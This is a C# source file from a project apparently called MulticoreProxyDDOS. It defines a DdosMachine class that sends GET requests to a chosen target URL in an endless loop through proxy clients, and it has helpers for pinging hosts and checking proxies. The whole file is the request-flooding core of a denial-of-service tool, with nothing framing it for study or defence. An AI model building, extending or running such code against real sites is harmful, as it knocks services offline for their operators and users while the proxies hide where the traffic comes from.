using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Serialization;
using Tools;
using Console = Tools.Console;

namespace MulticoreProxyDDOS.Client
{
    public class DdosMachine
    {
        private const int reconnectCount = 4;

        public PingReply Ping(string host, int timeout = 1000)
        {
            Ping p = new Ping();
            PingReply reply = p.Send(host, timeout: timeout);

            return reply;
        }

        public bool IsRunning { get; set; }

        public void Load(string targetUrl, ProxyData data)
        {
            using (ProxyClient client = CreateProxyClient(data))
            {
                while (this.IsRunning)
                {
                    this.Load(client, targetUrl);
                }
            }
        }

        void Load(ProxyClient client, string targetUri)
        {
            bool waitResponse = true;

            if (waitResponse)
            {
                Stopwatch s = Stopwatch.StartNew();
                HttpResponseMessage response = client.GetAsync(targetUri).Result;

                Console.WriteLine($"Response : {(int)response.StatusCode} {s.ElapsedMilliseconds}ms");
            }
            else
            {
                // ReSharper disable once HeuristicUnreachableCode
                client.GetAsync(targetUri);
            }
        }

        public string Read(string targetUrl, ProxyData data)
        {
            ProxyClient client = CreateProxyClient(data);

            HttpResponseMessage result = client.GetAsync(targetUrl).Result;

            string response = result.Content.ReadAsStringAsync().Result;

            return response;
        }

        public HttpStatusCode? CheckConnection(string targetUrl, ProxyData data) =>
            ProxyChecker.CheckProxy(data, targetUrl, reconnectCount);

        private static ProxyClient CreateProxyClient(ProxyData data)
        {
            ProxyClient client = new ProxyClient(data.Protocol, data.Ip, data.Port);

            return client;
        }
    }
}